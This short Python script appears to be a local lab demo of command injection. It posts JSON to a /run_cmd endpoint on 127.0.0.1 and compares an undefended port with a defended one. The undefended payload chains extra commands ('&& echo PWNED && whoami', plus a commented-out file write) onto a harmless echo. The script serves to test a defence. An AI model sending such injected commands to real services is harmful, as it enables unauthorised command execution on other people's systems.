import requests, argparse

parser = argparse.ArgumentParser()
parser.add_argument("--defended", action="store_true")
args = parser.parse_args()

port = 7002 if args.defended else 7001
url = f"http://127.0.0.1:{port}/run_cmd"

if not args.defended:
    #payload = {"cmd": "echo SAFE && echo PWNED > /tmp/pwned.txt"}
    payload = {"cmd": "echo SAFE && echo PWNED && whoami"}
else:
    payload = {"cmd": ["echo", "SAFE"]}

r = requests.post(url, json=payload, timeout=5)
print("Status:", r.status_code, "Body:", r.text)
